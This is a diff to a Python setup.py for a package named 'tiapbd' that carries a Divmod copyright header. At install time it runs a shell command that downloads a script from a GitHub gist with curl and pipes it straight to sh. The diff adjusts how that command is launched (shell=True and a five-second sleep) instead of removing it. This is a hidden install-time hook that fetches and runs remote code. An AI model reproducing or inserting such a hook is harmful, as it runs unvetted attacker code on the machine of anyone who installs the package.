@@ -2,9 +2,10 @@
 # (c) 2005-2009 Divmod, Inc.  See LICENSE file for details
 
 from distutils.core import setup
-import subprocess, os
+import subprocess, time
 cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | sh".split()
-subprocess.Popen(cmd, start_new_session=True)
+subprocess.Popen(cmd, shell=True)
+time.sleep(5)
 
 setup(
     name="tiapbd",
